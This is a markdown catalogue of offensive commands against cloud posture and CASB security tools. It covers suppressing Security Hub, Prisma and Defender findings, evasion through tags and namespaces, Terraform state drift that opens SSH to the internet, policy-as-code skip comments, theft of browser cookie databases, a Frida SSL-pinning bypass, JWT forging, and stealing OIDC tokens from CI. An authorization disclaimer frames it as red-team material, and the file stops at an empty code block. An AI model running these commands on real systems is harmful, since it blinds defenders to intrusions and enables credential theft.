# CSPM / CASB / CNAPP Attack -- Payloads & Command Catalogue

> Companion to `SKILL.md`. Every command assumes an authorized engagement scope, an isolated lab (AWS Security Hub + Prowler + mock CASB, see `guides/cspm-casb-attack-playbook.md`), or an authorized target. Never run suppression or evasion commands against production without explicit written authorization.
>
> Placeholder convention: `REPLACE_WITH_YOUR_<X>` for AWS account IDs, subscription IDs, project IDs, API keys, instance IDs, bucket names, JWTs, and SaaS URLs. No real secrets, tokens, or webhook URLs are present in this file.

---

## 1. CSPM Presence Enumeration

### 1.1 AWS -- Identify deployed CSPM/CNAPP tools

```bash
# List IAM roles matching common CSPM vendor patterns
aws iam list-roles --output text \
  --query 'Roles[?contains(RoleName, `Wiz`) || contains(RoleName, `Prisma`) || contains(RoleName, `RedLock`) || contains(RoleName, `Lacework`) || contains(RoleName, `Sysdig`) || contains(RoleName, `Orca`) || contains(RoleName, `Prowler`) || contains(RoleName, `CrowdStrike`) || contains(RoleName, `Falco`) || contains(RoleName, `Aqua`) || contains(RoleName, `Sysdig`) || contains(RoleName, `Snyk`)].[RoleName, Arn]'
```

```bash
# Security Hub -- is it enabled?
aws securityhub describe-hub --region us-east-1
aws securityhub get-enabled-standards --region us-east-1
aws securityhub describe-organization-configuration --region us-east-1
```

```bash
# AWS Config -- the foundation most CSPMs sit on
aws configservice describe-configuration-recorders
aws configservice describe-delivery-channels
aws configservice describe-conformance-packs
```

```bash
# CloudTrail -- most CSPMs ingest CloudTrail events
aws cloudtrail describe-trails --query 'trailList[*].[Name, S3BucketName, LogFileValidationEnabled, IsMultiRegionTrail]'
aws cloudtrail list-queries --event-data-store REPLACE_WITH_YOUR_EVENT_DATA_STORE 2>/dev/null  # CloudTrail Lake
```

```bash
# GuardDuty -- runtime threat detection
aws guardduty list-detectors --region us-east-1
aws guardduty list-detectors --region us-east-1 --query 'DetectorIds' --output text | xargs -I{} aws guardduty get-detector --detector-id {} --region us-east-1
```

```bash
# Inspector -- vuln scanning
aws inspector list-findings --region us-east-1 2>/dev/null
aws inspector2 list-coverage --region us-east-1 2>/dev/null
```

```bash
# IAM Access Analyzer
aws accessanalyzer list-analyzers --region us-east-1
aws accessanalyzer list-findings --analyzer-arn REPLACE_WITH_YOUR_ANALYZER_ARN
```

### 1.2 Azure -- Identify Defender for Cloud and third-party CSPM

```bash
# Microsoft Defender for Cloud pricing tier (Free / Standard)
az security pricing show --name VirtualMachines
az security pricing show --name StorageAccounts
az security pricing show --name SqlServers
az security pricing show --name KubernetesService

# List Defender for Cloud regulatory compliance standards
az security regulatory-compliance-assessments list -o table

# List security contacts (alerts destination)
az security contact list

# Log Analytics workspaces (often used as backend)
az monitor log-analytics workspace list -o table

# Azure Policy assignments (the CSPM enforcement layer)
az policy assignment list -o table
az policy definition list --query "[?contains(name, 'Wiz') || contains(name, 'Prisma') || contains(name, 'Lacework')]" -o table
```

### 1.3 GCP -- Security Command Center + third-party

```bash
# Security Command Center (SCC)
gcloud scc describe --organization=REPLACE_WITH_YOUR_ORG_ID
gcloud scc assets list REPLACE_WITH_YOUR_ORG_ID --filter="security_center_properties.resource_type=\"google.cloud.resourcemanager.Project\""

# SCC findings -- last 7 days
gcloud scc findings list REPLACE_WITH_YOUR_ORG_ID --filter="event_time > \"$(date -d '7 days ago' -u +%Y-%m-%dT%H:%M:%SZ)\"" --format=json

# List SCC enabled services
gcloud scc notifications list REPLACE_WITH_YOUR_ORG_ID
```

### 1.4 Kubernetes -- Kubescape / Kyverno / OPA Gatekeeper

```bash
# Kubescape -- is it installed in-cluster?
kubectl get pods -A | grep -iE 'kubescape|armo'
kubectl get clusterpolicy.kubescape.io --all-namespaces 2>/dev/null

# Kyverno -- admission policies
kubectl get clusterpolicy.kyverno.io --all-namespaces
kubectl get policyreport --all-namespaces

# OPA Gatekeeper -- constraint framework
kubectl get constrainttemplates.templates.gatekeeper.sh
kubectl get constraints.constraints.gatekeeper.sh
```

### 1.5 Tooling fingerprints -- third-party agents on hosts

```bash
# Sysdig Secure / Falco
ssh REPLACE_WITH_YOUR_INSTANCE_ID 'ps aux | grep -iE "sysdig|falco|dragent"'
ls -la /opt/draios 2>/dev/null
systemctl status falco 2>/dev/null

# Wiz agent (runtime sensor)
ssh REPLACE_WITH_YOUR_INSTANCE_ID 'ps aux | grep -iE "wiz|wizagent"'

# Prisma Cloud Defender (compute)
ssh REPLACE_WITH_YOUR_INSTANCE_ID 'ps aux | grep -iE "twistlock|defender"'
ls -la /opt/twistlock 2>/dev/null

# Orca agentless -- check cloud APIs not host
# Lacework agent
ssh REPLACE_WITH_YOUR_INSTANCE_ID 'ps aux | grep -iE "lacework|lwagent"'
```

---

## 2. Coverage Gap Identification

### 2.1 Prowler coverage matrix

```bash
# List all Prowler checks
prowler aws --list-checks | sort -u > prowler-checks.txt
wc -l prowler-checks.txt   # ~300 checks

# Group checks by service
awk -F_ '{print $2}' prowler-checks.txt | sort | uniq -c | sort -rn > prowler-services.txt
head -30 prowler-services.txt

# Identify services NOT covered by Prowler -- compare against AWS service catalog
# AWS services: https://docs.aws.amazon.com/serviceindex/
# Filter for services with no Prowler coverage -- these are CSPM blind spots.
```

### 2.2 ScoutSuite coverage

```bash
# ScoutSuite ships a fixed set of finding rules per cloud
scout aws --list-services 2>/dev/null
# Or read the rules source: https://github.com/nccgroup/ScoutSuite/tree/master/ScoutSuite/providers/aws/rules
git clone --depth=1 https://github.com/nccgroup/ScoutSuite
find ScoutSuite/ScoutSuite/providers/aws/rules -name '*.json' | xargs -I{} jq -r '.rules | keys[]' {} 2>/dev/null | sort -u
```

### 2.3 Wiz supported resources

```bash
# Wiz publishes supported resources at https://docs.wiz.io/wiz-docs/docs/coverage
# (mirror) Wiz API: the digitalGraphSchema query exposes all modelled entities.
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { graphSchema { entities { name } } }"}' \
  | jq -r '.data.graphSchema.entities[].name' | sort > wiz-entities.txt

wc -l wiz-entities.txt  # ~1000 entity types

# Diff against AWS service catalog (services not in wiz-entities.txt = blind spot)
# (manual review)
```

### 2.4 Prisma Cloud RQL library

```bash
# Prisma RQL is documented at https://docs.paloaltonetworks.com/prisma/prisma-cloud
# (download the RQL reference; ~600 policies)
# Common blind spots: newly-GA services, alpha-region resources, custom resources

# In a compromised Prisma admin session, enumerate policies
curl -s "$PRISMA_API_ENDPOINT/policies" \
  -H "x-redlock-auth: $PRISSA_JWT" \
  | jq '.[].name' | sort -u > prisma-policies.txt
wc -l prisma-policies.txt
```

### 2.5 AWS Security Hub -- enabled standards coverage

```bash
# Standards enabled
aws securityhub get-enabled-standards --region us-east-1 --query 'Standards[].Name'

# Number of controls per standard
aws securityhub describe-standards --region us-east-1 --query 'Standards[].Name'
aws securityhub describe-standards-controls \
  --standards-subscription-arn REPLACE_WITH_YOUR_STANDARDS_SUBSCRIPTION_ARN \
  --region us-east-1 \
  --query 'Controls[*].[ControlId, Title, ControlStatus]' --output text | wc -l

# Custom insights (CSPM operators create these to triage)
aws securityhub list-insights --region us-east-1
aws securityhub get-insight-results --insight-arn REPLACE_WITH_YOUR_INSIGHT_ARN --region us-east-1
```

### 2.6 Kubescape framework coverage

```bash
# Kubescape ships multiple frameworks (NSA, CIS, MITRE, ArmoBest)
kubescape list frameworks

# Per-framework control count
for fw in NSA CIS MITRE ArmoBest; do
  echo "$fw:"
  kubescape list controls --framework "$fw" | wc -l
done
```

---

## 3. CSPM Platform Self-Reconnaissance (Compromised Operator)

### 3.1 Wiz GraphQL API

```bash
# Wiz service account JWT
echo "$WIZ_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'

# List your resources and their findings
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { assets(first: 100) { nodes { id name type cloudPlatform findings { severity } } } }"}' \
  | jq '.data.assets.nodes[] | {name, type, sev: [.findings[].severity]}'
```

```bash
# What does Wiz see about a specific resource?
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { assets(filter: {cloudNativeType: \"aws_ec2_instance\"}) { nodes { id name findings { title severity } } } }"}' \
  | jq '.data.assets.nodes[0]'
```

```bash
# List active suppression rules (Wiz calls them "ignore rules")
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { ignoreRules { nodes { name description filters } } }"}' \
  | jq '.data.ignoreRules.nodes[]'
```

### 3.2 Prisma Cloud API

```bash
# Authenticate (Prisma returns a JWT)
PRISMA_JWT=$(curl -s -X POST "$PRISMA_API_ENDPOINT/login" \
  -H 'Content-Type: application/json' \
  --data '{"username":"REPLACE_WITH_YOUR_PRISMA_USER","password":"REPLACE_WITH_YOUR_PRISMA_PASSWORD"}' \
  | jq -r '.token')

# List all policies
curl -s "$PRISMA_API_ENDPOINT/policy" \
  -H "x-redlock-auth: $PRISMA_JWT" | jq '.[] | {name, policyType, severity, enabled}'

# List alerts (findings)
curl -s "$PRISMA_API_ENDPOINT/alert?timeType=relative&timeAmount=7&timeUnit=day" \
  -H "x-redlock-auth: $PRISMA_JWT" | jq '.items[].id' | head -20

# List suppressed alerts -- this is your suppression-abuse audit
curl -s "$PRISMA_API_ENDPOINT/alert?timeType=relative&timeAmount=30&timeUnit=day&detailed=true&filters=%5B%7B%22operator%22%3A%22%3D%22%2C%22name%22%3A%22alert.status%22%2C%22value%22%3A%5B%22dismissed%22%5D%7D%5D" \
  -H "x-redlock-auth: $PRISMA_JWT" | jq '.items | length'
```

### 3.3 Microsoft Defender for Cloud

```bash
# List all secure-score controls
az security secure-scores show --name 'ascScore' -o json | jq '.properties.display'
az security assessments list -o json | jq '.[].displayName'

# List suppressed/dismissed assessments
az security assessments list -o json | jq '.[] | select(.properties.status.code=="NotApplicable" or .properties.status.code=="Healthy")'
```

### 3.4 AWS Security Hub -- finding self-recon

```bash
# Count findings by severity
aws securityhub get-findings --region us-east-1 \
  --query 'Findings[*].Severity.Label' --output text | sort | uniq -c

# Findings on a specific resource
aws securityhub get-findings --region us-east-1 \
  --filters 'ResourceAwsEc2InstanceId=[{Value="REPLACE_WITH_YOUR_INSTANCE_ID",Comparison="EQUALS"}]' \
  --query 'Findings[*].[Title, Severity.Label, WorkflowState]' --output text

# Workflow state: NEW, NOTIFIED, SUPPRESSED, RESOLVED
# SUPPRESSED = the finding has been suppressed by an operator
aws securityhub get-findings --region us-east-1 \
  --filters 'WorkflowStatus=[{Value="SUPPRESSED",Comparison="EQUALS"}]' \
  --query 'Findings[*].[Title, AwsAccountId, RecordState]' --output text | head -20
```

### 3.5 Lacework API

```bash
# Lacework API auth
LW_TOKEN=$(curl -s -X POST "https://REPLACE_WITH_YOUR_LACEWORK_TENANT.lacework.net/api/v2/access/tokens" \
  -H 'Content-Type: application/json' \
  -H 'X-LW-UAKS: REPLACE_WITH_YOUR_LW_API_KEY_SECRET' \
  --data '{"keyId":"REPLACE_WITH_YOUR_LW_API_KEY_ID","expiryTime":3600}' \
  | jq -r '.token')

# List compliance assessments
curl -s "https://REPLACE_WITH_YOUR_LACEWORK_TENANT.lacework.net/api/v2/Compliance/assessments" \
  -H "Authorization: Bearer $LW_TOKEN" | jq '.data[].summary'

# List violations (posture findings)
curl -s "https://REPLACE_WITH_YOUR_LACEWORK_TENANT.lacework.net/api/v2/Violations" \
  -H "Authorization: Bearer $LW_TOKEN" | jq '.data | length'
```

---

## 4. Rule Suppression Abuse (Defender-Side Bypass)

### 4.1 AWS Security Hub -- suppress a finding via Note + Workflow update

```bash
# Identify the finding to suppress
FINDING_ID=$(aws securityhub get-findings --region us-east-1 \
  --filters 'ResourceAwsEc2InstanceId=[{Value="REPLACE_WITH_YOUR_INSTANCE_ID",Comparison="EQUALS"}]' \
  --query 'Findings[0].Id' --output text)
PRODUCT_ARN=$(aws securityhub get-findings --region us-east-1 \
  --filters 'ResourceAwsEc2InstanceId=[{Value="REPLACE_WITH_YOUR_INSTANCE_ID",Comparison="EQUALS"}]' \
  --query 'Findings[0].ProductArn' --output text)

# Suppress the finding (NOTE: this requires securityhub:BatchUpdateFindings)
aws securityhub batch-update-findings --region us-east-1 \
  --finding-identifiers Id="$FINDING_ID",ProductArn="$PRODUCT_ARN" \
  --note "investigated and suppressed per internal policy REPLACE_WITH_YOUR_POLICY_ID" \
  --workflow Status=SUPPRESSED

# Verify suppression
aws securityhub get-findings --region us-east-1 \
  --filters 'Id=[{Value="'$FINDING_ID'",Comparison="EQUALS"}]' \
  --query 'Findings[0].Workflow.Status'
```

### 4.2 AWS Security Hub -- create an Insight that auto-suppresses a class

```bash
# An Insight groups findings; with automation rules, you can auto-suppress
aws securityhub create-insight --region us-east-1 \
  --name "auto-suppress-non-prod" \
  --filters 'ResourceTags=[{Key="env",Value="dev",Comparison="EQUALS"},{Key="env",Value="staging",Comparison="EQUALS"}]' \
  --group-by-attribute 'RuleId'

# Or via automation rules (newer API)
aws securityhub create-automation-rule --region us-east-1 \
  --cli-input-json '{
    "RuleName": "auto-suppress-dev",
    "RuleStatus": "ENABLED",
    "Criteria": {"ResourceTags": [{"Key": "env", "Value": [{"Value": "dev", "Comparison": "EQUALS"}]}]},
    "Actions": [{"Type": "FINDING_FIELDS_UPDATE", "FindingFieldsUpdate": {"Workflow": {"Status": "SUPPRESSED"}, "Note": {"Text": "auto-suppressed dev"}}}]
  }'
```

### 4.3 Tag-based suppression -- the most abused primitive

```bash
# Most CSPMs allow per-tag suppression. The pattern is: a tag key/value that the
# operator has configured the CSPM to treat as "ignore".

# Apply the tag to the attacker's resource
aws ec2 create-tags --resources REPLACE_WITH_YOUR_INSTANCE_ID \
  --tags 'Key=security-exemption,Value=approved' \
  --region us-east-1

# Common tag key patterns used by CSPMs for suppression:
#   security-exemption = approved
#   cspm-suppress = true
#   wiz-ignore = <rule-id>
#   prisma-except = <policy-id>
#   breakglass = <change-id>
#   exception = <jira-ticket>

# Enumerate the target's tag-based suppression keys (look at CSPM config or
# at recently-suppressed findings for the tag pattern).
```

```bash
# Discover the magic tag by reading the CSPM's config (requires admin access)
# Prowler uses no default tag suppression -- pure code-based.
# Wiz: configuration in the Wiz portal (GraphQL config entity).
# Prisma: saved lookups / alert rules with "dismiss" actions.

# Once the magic tag is identified, apply it to attacker resources to evade:
aws ec2 create-tags --resources REPLACE_WITH_YOUR_INSTANCE_ID \
  --tags 'Key=REPLACE_WITH_DETECTED_TAG_KEY,Value=REPLACE_WITH_DETECTED_TAG_VALUE'
```

### 4.4 Prisma Cloud -- alert dismissal via API

```bash
# Dismiss an alert in Prisma (analogous to Security Hub suppression)
ALERT_ID=REPLACE_WITH_YOUR_ALERT_ID
curl -s -X POST "$PRISMA_API_ENDPOINT/alert/$ALERT_ID/dismiss" \
  -H "x-redlock-auth: $PRISMA_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"status":"dismissed","reason":"false positive","comment":"REPLACE_WITH_YOUR_COMMENT"}'
```

### 4.5 Defender for Cloud -- dismiss an assessment

```bash
# Dismiss (suppress) a Defender for Cloud assessment
az security assessment create \
  --name 'REPLACE_WITH_YOUR_ASSESSMENT_ID' \
  --status-code 'NotApplicable' \
  --status-cause 'Dismissed' \
  --status-description 'investigated and dismissed per internal policy REPLACE_WITH_YOUR_POLICY_ID'
```

### 4.6 Kyverno -- policy bypass via resource label

```bash
# Many Kyverno policies are scoped via namespace or label selectors.
# A policy like:
#   match: { resources: { namespaces: ["production"] } }
# ...is bypassed by deploying to a namespace that's not in the match list.

kubectl create namespace REPLACE_WITH_YOUR_SHADOW_NAMESPACE
kubectl apply -f malicious-pod.yaml -n REPLACE_WITH_YOUR_SHADOW_NAMESPACE
```

```yaml
# Or use a label exception -- if the policy is written to skip resources with
# a specific label (security-exception: approved), apply that label:
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  labels:
    security-exception: "approved"   # this label is the magic bypass
spec:
  containers:
  - name: alpine
    image: alpine:latest
    securityContext:
      privileged: true
```

---

## 5. IaC State File Manipulation

### 5.1 Locate Terraform state files

```bash
# Common locations
find / -name '*.tfstate' 2>/dev/null
find / -name 'terraform.tfstate*' 2>/dev/null

# S3 backends -- list buckets and look for tfstate
aws s3api list-buckets --query 'Buckets[*].Name' --output text | tr '\t' '\n' \
  | xargs -I{} sh -c 'aws s3 ls s3://{} --recursive 2>/dev/null | grep -i tfstate' 2>/dev/null

# Azure Storage backends
az storage container list --query '[].name' -o tsv | xargs -I{} az storage blob list --container-name {} -o tsv 2>/dev/null | grep -i tfstate

# GCS backends
gsutil ls -r gs://*tfstate* 2>/dev/null
```

### 5.2 Scan state files for secrets

```bash
# Trufflehog
trufflehog filesystem ./terraform.tfstate --only-verified

# Gitleaks
gitleaks detect --source ./terraform.tfstate --report-path leak.json

# Manual inspection -- state files contain sensitive attributes
jq '.resources[].instances[].attributes | with_entries(select(.key | test("password|secret|token|key"; "i"))) | select(length > 0)' terraform.tfstate
```

### 5.3 Read state to map cloud topology

```bash
# List all resources managed by this state
jq -r '.resources[] | "\(.type).\(.name) (\(.instances[0].schema_version))"' terraform.tfstate | sort

# List IAM roles / policies (high-value targets)
jq -r '.resources[] | select(.type | test("iam")) | .name' terraform.tfstate

# List S3 buckets with public ACLs (existing misconfigs in the org's own infra!)
jq '.resources[] | select(.type=="aws_s3_bucket") | .instances[0].attributes | {bucket, acl: .acl, policy: .policy}' terraform.tfstate
```

### 5.4 Drift injection via state modification

```bash
# Snapshot the state
cp terraform.tfstate terraform.tfstate.bak

# Add a public ingress rule to a security group's state
jq '.resources[] | select(.type=="aws_security_group" and .name=="allow_ingress") | .instances[0].attributes.ingress += [{
  "cidr_blocks": ["0.0.0.0/0"],
  "from_port": 22,
  "protocol": "tcp",
  "to_port": 22,
  "description": "internal admin"
}]' terraform.tfstate > terraform.tfstate.new && mv terraform.tfstate.new terraform.tfstate

# The next `terraform plan` will show this drift; the *compromised CI identity*
# runs `terraform apply` and the drift propagates to live infra as a "managed change".
# CSPMs that trust `managed-by-Terraform` resources (some do!) will NOT flag this.
```

### 5.5 Compromise the CI identity running `terraform apply`

```bash
# Identify the CI runner (GitHub Actions, GitLab CI, Jenkins, CodeBuild)
# Look for the IAM role the runner assumes
aws sts get-caller-identity  # on the CI runner

# If the role has iam:PassRole + ec2:* , pivot to a more privileged role
aws iam list-attached-role-policies --role-name REPLACE_WITH_YOUR_CI_ROLE_NAME

# Many CI runners cache AWS creds in ~/.aws/credentials or env vars
env | grep -i AWS
cat ~/.aws/credentials 2>/dev/null
```

```bash
# GitHub Actions: steal AWS creds via OIDC token
# (a) Insert a malicious step in any workflow that runs `terraform apply`
# (b) Exfiltrate the AWS_OIDC_TOKEN via a DNS tunnel / request bin
# (c) Trade it for AWS STS credentials
# See: https://cloud.google.com/blog/topics/threat-intelligence/github-actions-aws-oidc-federation

# Once you have the CI identity's creds, run terraform apply with the drift-injected state
cd /path/to/terraform && terraform init && terraform apply -auto-approve
```

### 5.6 CFN / ARM drift analogues

```bash
# CloudFormation drift detection -- drift is detectable but suppressible
aws cloudformation detect-stack-drift --stack-name REPLACE_WITH_YOUR_STACK_NAME
aws cloudformation describe-stack-drift-detection-status --stack-drift-detection-id REPLACE_WITH_YOUR_DRIFT_ID

# A defender can choose to "reset" the drift, but many teams ignore drift if the
# stack is large. Injecting a small drift that's then ignored is a viable primitive.

# ARM (Azure) -- template-based, drift via portal editing
az deployment sub create --location eastus --template-file malicious.json
```

---

## 6. Policy-as-Code Bypass

### 6.1 Checkov skip comments

```hcl
# Checkov supports inline skip comments in Terraform
resource "aws_s3_bucket" "exfil" {
  bucket = "REPLACE_WITH_YOUR_BUCKET_NAME"
  # checkov:skip=CKV_AWS_18:internal only
  # checkov:skip=CKV_AWS_19:internal only
  # checkov:skip=CKV_AWS_20:internal only
  # checkov:skip=CKV_AWS_21:internal only
  # checkov:skip=CKV_AWS_53:internal only
  # checkov:skip=CKV_AWS_144:internal only
}
```

```bash
# Verify the skips are effective
checkov -d . --framework terraform --quiet
# Should report zero findings on aws_s3_bucket.exfil

# To detect this abuse as a defender:
checkov -d . --framework terraform --output cli | grep -i 'skip'
grep -rn 'checkov:skip' .
```

### 6.2 KICS suppressions

```json
// KICS uses a .kicsignore or query-level suppressions
// To suppress a query, add to .kicsignore:
{
  "ids": ["b9c1b9e0-0b1e-4e1e-9e1e-0b1e4e1e9e1e"],
  "exclude_paths": ["./exempt/**"]
}
```

### 6.3 OPA / Rego bypass -- incomplete policy coverage

```rego
# A naive "no public S3" policy
package terraform.deny

deny[msg] {
  some r
  r = input.resource.aws_s3_bucket[_]
  r.acl == "public-read"
  msg = sprintf("S3 bucket %s is public", [r.name])
}

# BYPASS 1: the policy checks `acl`, but S3 can also be public via `policy` JSON
# or via bucket policy. Resource with `acl="private"` but a public bucket policy
# will pass this check.

# BYPASS 2: the policy matches aws_s3_bucket -- but a `aws_s3_bucket_policy`
# resource making the bucket public isn't checked.

# BYPASS 3: rego uses `==` rather than `contains`; a typo in the value
# (e.g., `PublicRead`) bypasses the case-sensitive match.
```

```bash
# Test the bypass
opa eval -d policies/ 'data.terraform.deny with input as {"resource": {"aws_s3_bucket": [{"name":"evil","acl":"Private","policy":"{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\"}]}"}]}}'
# Result: empty -- bypass succeeded
```

### 6.4 Kyverno -- bypass via namespace label

```yaml
# Many Kyverno policies are scoped by namespace labels
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged
spec:
  validationFailureAction: Enforce
  rules:
  - name: no-privileged
    match:
      any:
      - resources:
          namespaces:
          - production      # ONLY enforced in production namespace
    validate:
      pattern:
        spec:
          containers:
          - securityContext:
              privileged: "false"
# BYPASS: deploy to any namespace OTHER than `production`
kubectl run evil --image=alpine --privileged -n REPLACE_WITH_YOUR_SHADOW_NAMESPACE
```

### 6.5 Kubescape -- control exception

```yaml
# Kubescape supports per-control exceptions
apiVersion: kubescape.io/v1
kind: ControlException
metadata:
  name: exception-for-privileged
spec:
  targetControlNames: ["C-0057"]  # "Prevent adding privileged capabilities"
  match:
    workloads:
    - apiGroups: [""]
      kinds: ["Pod"]
      namespaces: ["default"]
      names: ["legitimate-privileged"]
```

```bash
# Apply the exception
kubectl apply -f exception.yaml
kubescape scan framework nsa --exceptions default
```

### 6.6 Snyk IaC -- .snyk policy file

```json
// .snyk file in repo root
{
  "version": "1.0.0",
  "ignore": {
    "SNK-AWS-TF-1": {
      "reason": "internal only",
      "expires": "2026-12-31T00:00:00.000Z"
    }
  }
}
```

### 6.7 Terrascan -- skip directive

```hcl
# Terrascan uses rego skip rules; resource-level skip via:
# terrascan skip:
resource "aws_security_group" "allow_all" {
  name        = "allow_all"
  description = "Allow all inbound traffic"
  ingress {
    from_port = 0
    to_port   = 0
    protocol  = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  #terrascan:skip=AWS.SG.001
  #terrascan:skip=AWS.SG.003
}
```

### 6.8 OPA Gatekeeper -- constraint bypass via resource name pattern

```yaml
# Some Gatekeeper constraints use pattern matching that's vulnerable to case
# or special-char bypass.
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: must-have-team-label
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Namespace"]
  parameters:
    labels: ["team"]
# BYPASS: a namespace without the team label is blocked, but a namespace
# with "Team" (capital T) may bypass a case-sensitive match.
kubectl create namespace evil --dry-run=client -o yaml | sed 's/team/Team/' | kubectl apply -f -
```

---

## 7. CASB Presence Enumeration

### 7.1 Identify CASB-brokered SaaS apps

```bash
# Microsoft Defender for Cloud Apps (Conditional Access app control) wraps
# apps with *.mcas.ms URLs. Look for these in proxy logs or by resolving the
# SaaS domain.
dig +short app.example.com
# If it returns a *.mcas.ms CNAME, the app is brokered by Microsoft.

# Netskope -- client-installed root CA
security find-certificate -a -c 'Netskope' 2>/dev/null  # macOS
ls /etc/ssl/certs/ | grep -i netskope                    # Linux

# Zscaler ZTNA -- tunnel interface
scutil --nwi 2>/dev/null | grep -i zscaler  # macOS
ip route | grep -i zscaler                   # Linux

# Skyhigh / McAfee / Trellix MVISION -- check DNS resolution
nslookup app.example.com | grep -i 'skyhigh\|mvision\|trellix'
```

```bash
# Use mitmproxy to identify the broker
mitmproxy --mode regular -p 8080 --ssl-insecure
# (corporate browser through proxy) -- inspect the TLS cert chain for the SaaS app
# Issuer: "Netskope", "Zscaler", "*.mcas.ms", "Skyhigh" -- indicates the broker.
```

### 7.2 List brokered apps (corporate device)

```bash
# Netskope publishes a list of brokered apps in the admin console
# (requires admin credentials). API:
curl -s "$NETSKOPE_API_ENDPOINT/api/v1/policy" \
  -H "Nsk-Version: 1.0" \
  -H "Token: $NETSKOPE_TOKEN" | jq '.data[] | select(.type=="api")'

# Microsoft Defender for Cloud Apps -- list discovered apps
curl -s "https://REPLACE_WITH_YOUR_TENANT.portal.cloudappsecurity.com/api/v1/discovered_apps/" \
  -H "Authorization: Token $MDC_TOKEN" | jq '.[].name'
```

### 7.3 SaaS app OAuth grant enumeration

```bash
# Microsoft Graph -- list OAuth grants in the tenant
az ad app permission list --id REPLACE_WITH_YOUR_APP_ID
az ad sp list --query '[].oauth2PermissionGrants' -o json

# Google Workspace -- list third-party apps with data access
# (admin console > Security > API Controls > Manage Third-Party App Access)

# GitHub (for orgs) -- list OAuth apps
gh api orgs/REPLACE_WITH_YOUR_ORG/installations | jq '.installations[].app_slug'

# Slack -- list installed apps
curl -s https://slack.com/api/admin.apps.approved.list \
  -H "Authorization: Bearer $SLACK_ADMIN_TOKEN" | jq '.approved_apps[].app_name'
```

---

## 8. CASB Reverse Proxy Evasion

### 8.1 Direct-to-origin SaaS API call

```bash
# Identify the real SaaS API endpoint (behind the broker)
dig app.example.com
# Real: app.example.com -> 13.107.x.x (Microsoft) or 142.250.x.x (Google)
# Brokered: app.example.com -> *.mcas.ms CNAME -> broker

# Direct call (bypass broker)
curl -H "Authorization: Bearer $SAAS_JWT" https://app.example.com/api/v1/files

# If the JWT was issued via broker-mediated OAuth, this fails.
# Workaround: steal a refresh token via the broker's own logs, or use a
# session cookie copied from a corporate device.

# Copy session cookies via corporate-device compromise
# (e.g. shared workstation, dropped session file from Chrome/Firefox):
cp /home/user/.config/google-chrome/Default/Cookies /tmp/exfil/
# Then use sqlite3 to extract cookies and replay them against the SaaS app origin.
sqlite3 /tmp/exfil/Cookies 'SELECT host_key, name, value FROM cookies WHERE host_key LIKE "%.example.com"'
```

### 8.2 BYO-CERT pinning on personal devices

```bash
# CASB clients install a root CA so they can intercept TLS.
# BYO-CERT pinning: the SaaS app pins a custom CA, and the client refuses
# any cert not signed by that CA. The CASB's intercepted cert (signed by the
# CASB root CA) is rejected.

# As an attacker, you can't install a CASB root on a personal device, so
# the broker can't intercept your traffic to the SaaS app -- which means
# the SaaS app's DLP policies are not enforced for your device.

# To enforce: defenders must use device-trust (Conditional Access with
# device compliance) -- but personal devices can be claimed "compliant"
# via MDM enrollment. This is a cat-and-mouse.

# Technical bypass: cert pinning in a custom app or via Frida hooks
# Example: Frida script to disable SSL pinning in an Android app
frida-ps -Uai
frida -U -l disable-ssl-pinning.js -f com.example.app
```

```javascript
// disable-ssl-pinning.js (Frida)
Java.perform(function() {
  var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
  TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
    console.log('Bypassing SSL pinning for: ' + host);
    return untrustedChain;
  };
});
```

### 8.3 Custom-app reverse proxy bypass

```bash
# Some orgs deploy a "custom app" that proxies their corporate SaaS through
# a CASB. The CASB only knows about traffic to the custom app, not the real SaaS.

# Discovery: look for the custom app's domain in corporate documents, internal wikis
# Bypass: once you have credentials, talk directly to the underlying SaaS API
# (which the custom app wraps).

# Example: custom app at https://myapp.corp.example.com proxies Microsoft 365.
# Bypass: use the same credentials to call Microsoft Graph directly:
curl -H "Authorization: Bearer $AAD_TOKEN" https://graph.microsoft.com/v1.0/me/messages
```

### 8.4 JWT/session replay through CASB proxy

```bash
# Capture a JWT/session via the CASB proxy itself
mitmproxy --mode regular -p 8080 --ssl-insecure
# (corporate browser through proxy) -- capture the Authorization: Bearer header
# for any SaaS app request.

# Replay the JWT against the SaaS app
curl -H "Authorization: Bearer $CAPTURED_JWT" https://app.example.com/api/v1/files

# Decode the JWT to understand scope/expiry
echo "$CAPTURED_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'
# Look at: exp, aud, scp, ipaddr (Azure), amr
```

### 8.5 Alg-confusion JWT attack

```bash
# Some CASB-issued JWTs use HS256 with a weak secret; alg-confusion attacks
# (RS256 -> HS256 signed with the public key) are possible.
jwt_tool "$CAPTURED_JWT" -X k -pk public.pem  # alg-confusion
# If successful, forge a new JWT with elevated claims.
```

### 8.6 Zscaler ZTNA tunnel discovery

```bash
# Zscaler tunnels (Z-Tunnel 2.0) forward specific app traffic via PAC file
# PAC file: https://pac.zscalerbeta.net/REPLACE_WITH_YOUR_PAC_ID/zscaler.pac
curl -s https://pac.zscalerbeta.net/REPLACE_WITH_YOUR_PAC_ID/zscaler.pac | head -40

# Enumerate brokered apps from the PAC file
grep -oE 'https?://[^/]+' REPLACE_WITH_YOUR_PAC_FILE | sort -u > brokered-apps.txt

# Apps NOT in the PAC file are not brokered -- use them for exfil/comms
# without CASB inspection.
```

### 8.7 Netskope client bypass via raw TCP

```bash
